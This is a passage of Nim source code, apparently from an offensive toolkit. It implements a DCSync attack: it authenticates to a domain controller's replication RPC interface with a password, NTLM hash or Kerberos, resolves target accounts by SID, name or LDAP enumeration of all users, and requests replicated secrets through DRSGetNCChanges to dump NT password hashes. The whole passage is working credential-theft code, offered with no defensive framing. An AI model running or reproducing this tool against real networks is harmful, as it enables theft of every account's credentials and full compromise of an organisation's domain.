  c.skip(4)
  c.skip(4)
  let cNumValues = c.readU32
  let rgValuesRef = c.readU32
  c.skip(4)

  when defined(dcsyncDebug):
    echo "[dcsync-debug] getnc header cNumObjects=", cNumObjects,
      " pObjects=0x", pObjectsRef.toHex(8), " cursor=", c.pos

  if pNcRef != 0:
    skipDsnameDeferred(c)

  if pUpToDateRef != 0:
    skipUpToDateVector(c)

  if pPrefixRef != 0 and prefixCount > 0:
    skipPrefixTableDeferred(c, prefixCount)

  when defined(dcsyncDebug):
    echo "[dcsync-debug] before objects cursor=", c.pos

  if pObjectsRef != 0 and cNumObjects > 0:
    result = parseReplEntInfList(c, sessionKey)

proc parseDrsGetNcChangesError*(stub: string): uint32 =
  if stub.len < 148:
    return 0
  var c = cu(stub)
  let pdwOutVersion = c.readU32
  let unionDisc = c.readU32
  if pdwOutVersion != 6 or unionDisc != 6:
    return 0
  c.skip(16)
  c.skip(16)
  c.skip(4)
  c.skip(24)
  c.skip(24)
  c.skip(4)
  c.skip(4)
  c.skip(8)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  c.skip(4)
  if c.ok(4):
    result = c.readU32
  if result == 0:
    var off = max(0, stub.len - 32)
    while off + 4 <= stub.len:
      let candidate = readU32Le(stub, off)
      if candidate >= 0x2000'u32 and candidate <= 0x21ff'u32:
        return candidate
      inc off, 4

proc dcSync*(host: string; port, timeoutMs: int;
             username, password, ntlmHash, domain, target: string;
             kerberos = false): Future[DcSyncResult] {.async.} =
  result = DcSyncResult(host: host, port: port, username: username, domain: domain)

  let cred = smb.SmbCredential(
    username: username,
    password: password,
    ntlmHash: ntlmHash,
    domain: domain
  )

  let dynamicPort =
    if kerberos:
      await rpc.resolveDynamicPortKerb(host, 135, timeoutMs,
        @DrsUuidBytes, 4'u16, 0'u16, domain)
    else:
      await rpc.resolveDynamicPort(host, 135, timeoutMs,
        @DrsUuidBytes, 4'u16, 0'u16, cred)
  let client =
    if kerberos:
      await rpc.connectAndBindKerb(host, dynamicPort, timeoutMs,
        @DrsUuidBytes, 4'u16, 0'u16, domain)
    else:
      await rpc.connectAndBind(host, dynamicPort, timeoutMs,
        @DrsUuidBytes, 4'u16, 0'u16, cred)
  defer: client.close()
  result.authenticated = true
  let sessionKey =
    if kerberos: client.kc.sessionKey()
    else: client.sec.sessionKey
  let bindStub = buildDrsBindRequest()
  let bindResp = await client.call(0'u16, bindStub)
  dcsyncDebug("DRSBind response", bindResp.stub)
  if not bindResp.ok or bindResp.stub.len < 24:
    result.error = "DRSBind failed"
    if bindResp.faultStatus != 0:
      result.error.add " (fault 0x" & bindResp.faultStatus.toHex(8) & ")"
    elif bindResp.stub.len > 0:
      let rc = readU32Le(bindResp.stub, bindResp.stub.len - 4)
      result.error.add " (status 0x" & rc.toHex(8) & ")"
    return

  let (hDrs, bindOk) = parseDrsBindResponse(bindResp.stub)
  if not bindOk:
    result.error = "DRSBind returned error"
    return

  var targetDn = target
  var targetSidBytes = ""
  var targetGuidBytes = ""
  var replicaGuid = ""
  if domain.len > 0:
    let dcInfoStub = buildDrsDomainControllerInfoRequest(hDrs, domain)
    let dcInfoResp = await client.call(16'u16, dcInfoStub)
    dcsyncDebug("DRSDomainControllerInfo response", dcInfoResp.stub)
    if dcInfoResp.ok and dcInfoResp.stub.len > 0:
      replicaGuid = parseDrsDomainControllerInfoGuid(dcInfoResp.stub)
  if replicaGuid.len == 0:
    replicaGuid = await discoverReplicaGuid(host, timeoutMs, username, password,
      ntlmHash, domain, kerberos = kerberos)
  if targetDn.startsWith("S-1-"):
    targetSidBytes = sidFromString(targetDn)
    if targetSidBytes.len == 0:
      result.error = "invalid SID target: " & targetDn
      return
    let crackStub = buildDrsCrackNamesRequest(hDrs, targetDn, 11'u32, 6'u32)
    let crackResp = await client.call(12'u16, crackStub)
    dcsyncDebug("DRSCrackNames SID GUID response", crackResp.stub)
    if crackResp.ok and crackResp.stub.len > 0:
      let guidText = parseDrsCrackNamesResponse(crackResp.stub)
      if guidText.len > 0:
        let crackedGuid = guidBytesFromString(guidText)
        if crackedGuid.len > 0:
          targetGuidBytes = crackedGuid
          targetSidBytes = ""
  elif targetDn.len > 0 and not (targetDn.contains('=') and targetDn.contains(',')):
    let crackName = asNt4AccountName(domain, targetDn)
    let crackStub = buildDrsCrackNamesRequest(hDrs, crackName, 2'u32, 6'u32)
    let crackResp = await client.call(12'u16, crackStub)
    dcsyncDebug("DRSCrackNames GUID response", crackResp.stub)
    if crackResp.ok and crackResp.stub.len > 0:
      let guidText = parseDrsCrackNamesResponse(crackResp.stub)
      if guidText.len > 0:
        targetGuidBytes = guidBytesFromString(guidText)
      if targetGuidBytes.len == 0:
        let dnStub = buildDrsCrackNamesRequest(hDrs, crackName, 2'u32, 1'u32)
        let dnResp = await client.call(12'u16, dnStub)
        dcsyncDebug("DRSCrackNames DN response", dnResp.stub)
        let dn = if dnResp.ok and dnResp.stub.len > 0: parseDrsCrackNamesResponse(dnResp.stub) else: ""
        if dn.len > 0:
          targetDn = dn
        else:
          result.error = "DRSCrackNames could not resolve: " & target
          return
      elif targetDn.len == 0:
        targetDn = crackName
    if targetGuidBytes.len == 0 and targetDn.len > 0:
      targetSidBytes = await resolveTargetSid(host, timeoutMs, username, password,
        ntlmHash, domain, "", targetDn, target, kerberos = kerberos)
    if targetGuidBytes.len == 0 and targetDn.len == 0:
      result.error = "DRSCrackNames could not resolve: " & target
      return
  elif targetDn.len > 0:
    targetSidBytes = await resolveTargetSid(host, timeoutMs, username, password,
      ntlmHash, domain, "", targetDn, target, kerberos = kerberos)
  elif targetDn.len == 0 and domain.len > 0:
    var ncParts: seq[string] = @[]
    for piece in domain.split('.'):
      let clean = piece.strip()
      if clean.len > 0:
        ncParts.add "DC=" & clean
    let ncDn = ncParts.join(",")
    let userList = await enumerateAllUsers(host, timeoutMs, username, password,
      ntlmHash, domain, ncDn, kerberos = kerberos)
    if userList.len == 0:
      result.error = "LDAP enumeration returned no users"
      return
    for u in userList:
      let sidStr = sidBytesToString(u.sid)
      var guidBytes = ""
      if sidStr.len > 0:
        let crackStub = buildDrsCrackNamesRequest(hDrs, sidStr, 11'u32, 6'u32)
        let crackResp = await client.call(12'u16, crackStub)
        if crackResp.ok and crackResp.stub.len > 0:
          let guidText = parseDrsCrackNamesResponse(crackResp.stub)
          if guidText.len > 0:
            guidBytes = guidBytesFromString(guidText)
      let ncStub = buildDrsGetNcChangesRequest(hDrs, "", u.sid, guidBytes, replicaGuid)
      let ncResp = await client.call(3'u16, ncStub)
      if ncResp.ok and ncResp.stub.len > 0:
        let accts = parseDrsGetNcChangesResponse(ncResp.stub, sessionKey)
        for a in accts:
          if a.ntHash.len > 0 or a.username.len > 0:
            result.accounts.add a
    if result.accounts.len == 0:
      for u in userList:
        let sidStr = sidBytesToString(u.sid)
        var guidBytes = ""
        if sidStr.len > 0:
          let crackStub = buildDrsCrackNamesRequest(hDrs, sidStr, 11'u32, 6'u32)
          let crackResp = await client.call(12'u16, crackStub)
          if crackResp.ok and crackResp.stub.len > 0:
            let guidText = parseDrsCrackNamesResponse(crackResp.stub)
            if guidText.len > 0:
              guidBytes = guidBytesFromString(guidText)
        let ncStub = buildDrsGetNcChangesRequest(hDrs, "", u.sid, guidBytes, replicaGuid,
          exop = ExopReplSecrets)
        let ncResp = await client.call(3'u16, ncStub)
        if ncResp.ok and ncResp.stub.len > 0:
          let accts = parseDrsGetNcChangesResponse(ncResp.stub, sessionKey)
          for a in accts:
            if a.ntHash.len > 0 or a.username.len > 0:
              result.accounts.add a
    result.success = result.accounts.len > 0
    if result.success:
      result.message = "dumped " & $result.accounts.len & " account(s)"
    else:
      result.error = "no accounts returned"
    return

  let ncStub = buildDrsGetNcChangesRequest(hDrs, targetDn, targetSidBytes,
    targetGuidBytes, replicaGuid)
  dcsyncDebug("DRSGetNCChanges request", ncStub)
  let ncResp = await client.call(3'u16, ncStub)
  dcsyncDebug("DRSGetNCChanges response", ncResp.stub)

  if not ncResp.ok or ncResp.stub.len == 0:
    result.error = "DRSGetNCChanges returned empty response"
    if ncResp.faultStatus != 0:
      result.error.add " (fault 0x" & ncResp.faultStatus.toHex(8) & ")"
    return

  let accounts = parseDrsGetNcChangesResponse(ncResp.stub, sessionKey)
  result.accounts = accounts
  result.success = accounts.len > 0
  if result.success:
    result.message = "dumped " & $accounts.len & " account(s)"
  else:
    let drsError = parseDrsGetNcChangesError(ncResp.stub)
    if drsError != 0:
      result.error = "DRSGetNCChanges failed (DRS error 0x" & drsError.toHex(8) & ")"
    else:
      result.error = "no accounts returned"
